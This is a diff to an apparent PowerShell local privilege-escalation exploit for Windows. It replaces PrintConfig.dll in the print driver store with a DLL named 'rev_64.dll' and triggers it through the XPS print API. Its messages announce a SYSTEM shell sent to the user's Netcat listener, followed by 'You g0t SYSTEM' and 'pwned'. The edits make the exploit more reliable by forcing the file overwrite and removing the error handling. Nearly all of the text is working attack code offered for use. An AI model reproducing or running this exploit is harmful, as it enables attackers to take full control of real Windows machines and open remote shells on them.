@@ -1,4 +1,5 @@
-Copy-Item ".\rev_64.dll" -Destination "C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_e4ff50d4d5f8b2aa\Amd64\PrintConfig.dll"
+Copy-Item ".\rev_64.dll" -Destination "C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_e4ff50d4d5f8b2aa\Amd64\PrintConfig.dll" -Force
+echo "[+] Spawnning SYSTEM shell sent to your Netcat ..."
 $mycode = @"
 using System;
 using System.ComponentModel;
@@ -34,7 +35,8 @@ CloseHandle(completionEvent);
 }
 private static void StartJob(string printerName, string jobName, IntPtr completionEvent, out IXpsPrintJob job, out IXpsPrintJobStream jobStream)
 {
-int result = StartXpsPrintJob(printerName, jobName, null, IntPtr.Zero, completionEvent,
+int result = StartXpsPrintJob(printerName, jobName,
+"c:\\windows\\temp\\test.txt", IntPtr.Zero, completionEvent,
 null, 0, out job, out jobStream, IntPtr.Zero);
 
 }
@@ -101,8 +103,11 @@ WAIT_FAILED = -1
 
 "@
 add-type -typeDefinition $mycode
-try { [XPS.XpsPrint]::StartPrintJob() }
-catch { "[+] You g0t SYSTEM !" }
+[XPS.XpsPrint]::StartPrintJob()
+#try { [XPS.XpsPrint]::StartPrintJob() }
+#catch { "!" }
+echo "[+] You g0t SYSTEM !!!"
 echo "[+] pwned !"
 echo ""
 exit
+
